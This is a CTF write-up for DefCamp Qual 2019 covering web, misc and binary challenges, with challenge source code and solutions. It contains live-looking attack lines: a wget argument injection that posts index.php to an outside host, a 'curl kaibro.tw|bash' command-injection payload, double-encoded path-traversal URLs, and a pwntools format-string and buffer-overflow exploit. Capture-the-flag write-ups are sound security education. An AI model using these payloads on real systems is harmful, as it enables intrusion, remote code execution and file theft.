# DefCamp CTF Qual 2019

**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20190907-defcampctfqual/) of this writeup.**


 - [DefCamp CTF Qual 2019](#defcamp-ctf-qual-2019)
   - [Web](#web)
     - [Downloader v1](#downloader-v1)
     - [imgur](#imgur)
     - [online-album](#online-album)
   - [Misc](#misc)
     - [numbers](#numbers)
     - [Eye Of The Tiger](#eye-of-the-tiger)
   - [PwnRev](#pwnrev)
     - [get-access](#get-access)
     - [secret](#secret)
     - [crack-me-username](#crack-me-username)


## Web

### Downloader v1

This challenge allows you to input a URL. Then it will use `wget` to download the content of this URL and put it into `/upload/<random>`. After this, it will run `bash -c 'rm $target/*.{php,pht,phtml,php4,php5,php6,php7}'` to prevent uploading php files.

But we can use argument injection to upload file:

`wget http://kaibro.tw --post-file=/var/www/html/index.php kaibro.tw:8787`

```php
<?php

ini_set('display_errors', 0);
$out   = false;
$url   = $_POST['url'] ?? false;
$error = false;

if ($url && !preg_match('#^https?://([a-z0-9-]+\.)*[a-z0-9-]+\.[a-z0-9-]+/.+#i', $url)) {
    $error = 'Invalid URL';
} else if ($url && preg_match('/\.(htaccess|ph(p\d?|t|tml))$/', $url)) { // .htaccess .php .php3 -  .php7 .phtml .pht
    $error = 'Sneaky you!';
}

if (!$error && $url) {
    $target = 'uploads/' .uniqid() . bin2hex(openssl_random_pseudo_bytes(8));
    mkdir($target);
    chdir($target);
    touch('.htaccess');

    $cmd = escapeshellcmd('wget ' . $url) . ' 2>&1';
    $out = "\$ cd $target" . PHP_EOL;
    $out .= '$ ' . $cmd . PHP_EOL;
    $out .= shell_exec($cmd);

    $cmd = "bash -c 'rm $target/*.{php,pht,phtml,php4,php5,php6,php7}'";
    $out .= '$ ' . $cmd . PHP_EOL;
    $out .= shell_exec($cmd) . PHP_EOL;
}

?><!DOCTYPE html>
<html>
<head>
    <title>Downloader v1</title>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
</head>
<body>

<div class="container mt-5">
    <div class="row">
        <div class="col-8 offset-2">
            <h3 class="text-center">File downloader v1</h3>
            <div class="card mt-5">
                <div class="card-header">Specify an URL to download</div>
                <form class="card-body" method="POST">
                    <?php if ($error): ?>
                    <div class="alert alert-danger" role="alert"><?php echo htmlentities($error); ?></div>
                    <?php endif;?>
                    <div class="form-group">
                        <label>URL to download:</label>
                        <input type="text" name="url" placeholder="http://example.com/image.jpg" value="<?php echo htmlentities($url, ENT_QUOTES); ?>" class="form-control" >
                    </div>
                    <button type="submit" class="btn btn-primary float-right">Submit</button>
                </form>
                <?php if ($out): ?>
                <div class="card-header card-footer">Output:</div>
                <div class="card-body">
                    <pre><code><?php echo htmlentities($out); ?></code></pre>
                </div>
                <?php endif;?>
            </div>
        </div>
    </div>
</div>

<!-- <a href="flag.php">###</a> -->
```

read the `flag.php`:

```php
GET ME!
<?php /* DCTF{f8ebc33b836f0ac262fef4c18d3b18ed405da41bb4389c0d0fa1a5a997da1af0} */ ?>
```

### imgur

In this challenge, you can set your avatar from imgur.com.

It will download the image from imgur.com and put it into `profiles/xxxxx.jpg`.

And there is a LFI vulnerability: `?page=xxxxx`

So our target is to put malicious php code into image, then use LFI include it to RCE.

![](https://github.com/w181496/CTF/raw/master/dctf2019-qual/imgur/imgur.png)

`DCTF{762241E8981F7E4C2B134C2894747990989FB5DFF0A3AD8DB5A0CEB5D05CBD8D}`

### online-album

In this challenge, the `/download/` path looks so weird.

e.g. Visiting `/download/index.php` will show the php source code.

After fuzzing, I found path traversal vulnerability: `https://online-album.dctfq19.def.camp/download/%252e%252e%252fcomposer.json`

So we can read any php source code now:

`/download/%252e%252e%252froutes/web.php`

```php
<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::get('/', function () {
    return view('welcome');
});

Auth::routes();

Route::get('/home', 'HomeController@index')->name('home');
Route::get('/album/{path}', 'HomeController@album')->name('album')->where('path', '.*');
Route::get('/download/{path}', 'HomeController@download')->name('download')->where('path', '.*');
Route::post('/auto-logout', 'HomeController@auto_logout')->name('auto-logout');
```

Let's read the HomeController: `/download/%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f/var/www/html/app/Http/Controllers/HomeController.php`

```php
<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Auth;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
        return view('home');
    }

    public function album(Request $request, $path)
    {
        // dd($path);
        // dd(getcwd());

        $path = urldecode($path);

        if ($path[0] == "/") {
            $path = substr($str, 1);
        }
        
        $files = scandir($path);
        
        foreach ($files as $key => $file) {
            if ($file[0] == ".") {
                unset($files[$key]);
            }
        }
        // $files = scandir("/var/www/html/");
        $html = "";
        foreach ($files as $photo) {
            $info = pathinfo($photo);
            if(array_key_exists("extension", $info)){
                if ($info["extension"] == "jpeg") {
                $html.="<a target='_blank' href='/download/".$path."/".$photo."'><img width='700' src='/".$path."/".$photo."'></a><hr>";
                }
            }
            
        }
        return view('home', [
            "files" => $files,
            "html" => $html,
        ]);     

    }

    public function download(Request $request, $path)
    {
        // dd($path);
        // dd(getcwd());

        $path = urldecode($path);

        if ($path[0] == "/") {
            $path = substr($str, 1);
        }

        if (strpos($path, "../..")) {
            dd("Ilegal path found!");
        }

        $file = file_get_contents($path);
        return $file;

    }

    public function auto_logout(Request $request)
    {
        Auth::logout();
        //delete file after logout
        $cmd = 'rm "'.storage_path().'/framework/sessions/'.escapeshellarg($request->logut_token).'"';
        shell_exec($cmd);
    }


}
```

There is a obvious Command Injection vulnerability in  the `auto_logout()` function.

We can insert `";curl kaibro.tw|bash;"` into `logout_token`, then get RCE.

![](https://github.com/w181496/CTF/raw/master/dctf2019-qual/onlinealbum/flag.png)

`DCTF{1196df3f624df7a099d4364e96df21a4c7283071177237bdd36e0981da68bd29}`

## Misc

### numbers

This challenge is a classic nim game. First, build a nim game state table. Then, we are done. Notice that the timeout limit is very strict. So I rent a GCP server in switzerland in order to solve it.

```python
#!/usr/bin/env python3
from pwn import *

r = remote('206.81.24.129', 2337)

r.sendlineafter("Hi! What's your name?\n", 'a')
r.sendlineafter('Ready? Y/N\n', 'Y')

def nim_tables(moves):
    table = [0]
    for i in range(1, 1000 + 1):
        values = []
        for move in moves:
            if i - move >= 0:
                values.append(table[i - move])
        if 0 in values:
            table.append(1)
        else:
            table.append(0)
    return table

def go():
    r.recvlines(2)
    moves = eval(r.recvline())
    moves = sorted(moves)
    table = nim_tables(moves)

    while True:
        text = r.recvline()
        score = int(text.decode().partition('Total Score:  ')[2])
        print(f'score: {score}')
        for move in moves[::-1]:
            if score - move >= 0 and table[score - move] == 0:
                r.sendlineafter('Your move: ', str(move))
                break
        text = r.recvline()
        if b'Well done' in text:
            break
        text = r.recvline()
        if b'Well done' in text:
            break

for i in range(10):
    go()
```

### Eye Of The Tiger
We found the solution to this challenge at the last 20 minutes, and it's too late to solve it. QQ

This challenge is a tutorial video. We found that there was a adblock [chrome extension](https://github.com/gorhill/uBlock) installed on the author's computer, and it added a number continuously. 

![](https://i.imgur.com/xTs7lLG.png)

We noticed that this number only added either 1 or 2. We recorded the amount of change and converted them to 0 and 1. Then, we converted each 8 bits to an ascii character. The final result is the flag.

```
01000100010000110101010001000110011110110011000001100100
DCTF{0d
```



## PwnRev
### get-access
There was an format string vulnerability in the username. I used `%p` to dump the stack, and I found a string from `%30$p`. It's the password for this challenge.

```
username: test
password: $_TH1S1STH34W3S0M3P4sSw0RDF0RY0UDCTF2019_
```

### secret

Just use format string to leak `canary` and `libc base`; then use buffer overflow to write retrun address as one gadget.

```python
#!/usr/bin/env python

from pwn import *

ip = "206.81.24.129"
port = 1339

context.arch = "amd64"

r = remote(ip, port)
# r = process("pwn_secret")

raw_input("$")
r.sendlineafter(":", "_%15$p_%16$p_%17$p")
out = r.recvline().split("_")
canary = int(out[1], 16)
code_base = int(out[2], 16) - 3136
libc_base = int(out[3], 16) - 133168

log.info(hex(canary))
log.info(hex(code_base))
log.info(hex(libc_base))

r.sendlineafter(":", flat("a" * 136, canary, 'b' * 8, libc_base + 0x45216))

r.interactive()
```

### crack-me-username

After reversing, the input string will be mapped to `6U2SRYZ9A84VQXK>7;F5E?I0GJW=PD3<MT@BLH:NO1C` one byte by one byte and insert to the balance tree. And then, check the pre-order traversal is equals to `E852036?;<B@DLIGJPNU`. Therefore, do the reverse way and we get the username `D9TCEFL20ASHIW1GNORM`.
